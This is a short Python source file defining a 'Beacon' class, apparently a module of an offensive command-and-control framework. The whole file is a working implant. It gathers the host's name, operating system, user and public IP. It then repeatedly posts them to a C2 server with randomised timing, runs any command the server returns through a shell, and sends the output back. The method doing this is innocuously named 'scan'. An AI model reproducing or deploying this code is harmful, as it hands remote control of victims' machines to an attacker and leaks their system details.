import requests
import time
import random
import platform
import os
import subprocess
import json

class Beacon:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P1"
        self.level = "Critical"

    def get_system_info(self):
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "user": os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
            "ip": requests.get("https://api.ipify.org").text,
        }

    def execute_cmd(self, cmd):
        return subprocess.check_output(cmd, shell=True).decode()

    def scan(self, target, interval=60, jitter=10):
        c2_url = target
        info = self.get_system_info()
        implant_id = info.get('hostname', 'unknown')
        print(f"[Beacon] Starting beacon from {implant_id} to {c2_url}")

        while True:
            try:
                resp = requests.post(f"{c2_url}/beacon", json=info)
                if resp.status_code == 200:
                    cmd = resp.json().get('command')
                    if cmd:
                        print(f"[Beacon] Executing: {cmd}")
                        result = self.execute_cmd(cmd)
                        requests.post(f"{c2_url}/result", json={"hostname": implant_id, "output": result})
                time.sleep(interval + random.randint(-jitter, jitter))
            except Exception as e:
                print(f"[Beacon] Error: {e}")
                time.sleep(60)
